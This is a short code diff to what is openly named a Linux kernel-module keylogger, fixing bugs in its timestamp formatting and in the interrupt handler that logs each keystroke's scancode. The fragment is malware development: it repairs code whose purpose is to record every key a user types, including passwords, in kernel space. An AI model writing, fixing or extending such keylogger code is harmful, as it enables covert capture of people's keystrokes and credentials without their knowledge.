@@ -128,7 +128,7 @@ int generate_timestamp(char *out)
 	
 	ktime_get_ts64(&ts);
 
-	if (sprintf(out, "%.2d:%.2d:%.2d", (ts.tv_sec/3600) % 24, (ts.tv_sec/60) % 60, ts.tv_sec % 60) < 0)
+	if (sprintf(out, "%.2lld:%.2lld:%.2lld", (ts.tv_sec/3600) % 24, (ts.tv_sec/60) % 60, ts.tv_sec % 60) < 0)
 	{
 		printk(KERN_ERR "[Keylogger] Sprintf failed to copy timestamp.\n");
 		return (-1);
@@ -144,11 +144,11 @@ static irqreturn_t keylogger_handle(int irq_n, void *data)
 	char log_line[64];
 	(void)logs;
 
-	memseto(log_line, 0, 64);
+	memset(log_line, 0, 64);
 	generate_timestamp(log_line);
 	printk(KERN_INFO "%s ", log_line);
 	handle_scancode(key);
-	log_line[strlen([log_line])] = '\n'; //add a new line at end of our log entry
+	log_line[strlen(log_line)] = '\n'; //add a new line at end of our log entry
 	add_new_entry(log_line);
 	return IRQ_HANDLED;
 }
